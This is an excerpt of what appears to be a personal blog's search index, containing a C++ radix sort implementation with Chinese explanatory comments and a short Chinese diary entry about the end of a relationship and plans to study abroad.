class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">rxsort</span><span class="params">(<span class="keyword">int</span> A[],<span class="keyword">int</span> l,<span class="keyword">int</span> h,<span class="keyword">int</span> d,<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">NULL</span>==A||l&gt;h)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> size = h-l+<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span>* counts = <span class="keyword">new</span> <span class="keyword">int</span>[k];<span class="comment">//用于计数排序的辅助数据，详见计数排序</span></span><br><span class="line">    <span class="keyword">int</span>* temp = <span class="keyword">new</span> <span class="keyword">int</span>[size];<span class="comment">//用于存储重新排序的数组</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> pval=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//依次处理不同的位</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;d;i++)&#123;</span><br><span class="line">        <span class="comment">//counts数组清零</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;k;j++)</span><br><span class="line">            counts[j] = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=l;j&lt;=h;j++)&#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            1.data[j]/pval：去掉数字data[j]的后i个数，例如：</span></span><br><span class="line"><span class="comment">            当data[j]=1234,i=2时，此时pval=100,data[j]/pval=12;</span></span><br><span class="line"><span class="comment">            2.(data[j]/pval)%k：取数字data[j]/pval的最后一位数</span></span><br><span class="line"><span class="comment">            3.(int)(data[j]/pval)%k:取数字data[j]的第i位数</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            index = (<span class="keyword">int</span>)(A[j]/pval)%k;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            统计数组A中每个数字的第i位数中各个数字的频数,用于计数排序；</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            counts[index]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//计算累加频数，用户计数排序</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;k;j++)</span><br><span class="line">            counts[j] = counts[j] + counts[j<span class="number">-1</span>];</span><br><span class="line">        <span class="comment">//使用倒数第i+1位数对A进行排序</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=h;j&gt;=l;j--)&#123;</span><br><span class="line">            index = (<span class="keyword">int</span>)(A[j]/pval)%k;</span><br><span class="line">            temp[counts[index]<span class="number">-1</span>] = A[j];</span><br><span class="line">            counts[index]--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将按第i为数排序后的结果保存回数组A中</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)</span><br><span class="line">            A[j+l] = temp[j];</span><br><span class="line">        <span class="comment">//更新pval</span></span><br><span class="line">        pval = pval*k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span>[] counts;</span><br><span class="line">    <span class="keyword">delete</span>[] temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随笔</title>
      <link href="/2021/07/05/%E9%9A%8F%E7%AC%94/"/>
      <url>/2021/07/05/%E9%9A%8F%E7%AC%94/</url>
      
        <content type="html"><![CDATA[<p>もう終わった，从未想过会这样潦草收场，曾讥笑两三个月的快餐式恋爱，以为自己不一样，看来我错了（笑）是我不理解其中苦衷吧没有真正的对与错吧，有些矛盾无法解决，分歧在相处中只会愈发显现，一段感情意味着的责任也只有身处其中才能感受到，大概都累了吧</p><p>今年的春色因你而格外明艳，感谢从我的世界走过，お元気ですか、私は元気です，脑海莫名浮现一起去看的《情书》的名场景。</p><p>it’s probably for the best，我大概无法抽出精力给一场终究不会有结果的感情吧——不久前终于下定了留学的决心，或许没有那么多时间去玩闹了吧……一念既定，万山难阻，愿走出这墙内，去外面的世界</p><p>一如今生，<br>无有也无是，<br>无痛也无乐。</p><p>佩索阿可真是个妙人，道破我此时的心理状态。似乎确凿没有感受到很多痛苦，这样的结果是我纠结后的选择，意识到不合适，大抵就应该这般快刀斩断吧</p><p>不知命运是否会让我在大学认识the one，更不知会是什么样的，不过我想，她应是能够陪我一同学习进步的吧，“绿鬓视草，红袖添香，眷属疑仙”，又甚至，她能陪我一起出国？学长学姐的事迹令人艳羡，双双赴美，只羡鸳鸯不羡仙……命运一向待我不薄，或许会遇到吧</p><p>这红酒后劲有点足，头居然这就晕了，晚安，南京</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
